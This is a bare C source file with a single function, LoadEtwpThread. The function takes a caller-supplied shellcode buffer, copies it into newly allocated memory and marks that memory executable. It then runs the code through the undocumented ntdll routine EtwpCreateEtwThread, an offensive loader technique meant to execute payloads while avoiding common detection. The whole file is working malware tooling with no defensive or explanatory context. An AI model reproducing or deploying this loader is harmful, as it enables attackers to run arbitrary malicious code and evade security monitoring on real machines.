#include <stdio.h>
#include <windows.h>


int LoadEtwpThread(unsigned char *shellcode, int length) {
    const DWORD MemCommit = 0x1000;
    const DWORD MemReserve = 0x2000;
    const DWORD PageExecuteRead = 0x20;
    const DWORD PageReadwrite = 0x04;

    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    HMODULE ntdll = LoadLibraryA("ntdll.dll");

    FARPROC VirtualAlloc = GetProcAddress(kernel32, "VirtualAlloc");
    FARPROC VirtualProtect = GetProcAddress(kernel32, "VirtualProtect");
    FARPROC EtwpCreateEtwThread = GetProcAddress(ntdll, "EtwpCreateEtwThread");
    FARPROC WaitForSingleObject = GetProcAddress(kernel32, "WaitForSingleObject");

    LPVOID addr = NULL;
    DWORD oldProtect = 0;
    HANDLE thread = NULL;

    addr = (LPVOID) VirtualAlloc(NULL, length, MemCommit | MemReserve, PageReadwrite);
    RtlCopyMemory(addr, shellcode, length);
    VirtualProtect(addr, length, PageExecuteRead, &oldProtect);
    thread = (HANDLE) EtwpCreateEtwThread(addr, 0, 0);
    WaitForSingleObject(thread, INFINITE);

    FreeLibrary(kernel32);
    FreeLibrary(ntdll);

    return 0;
}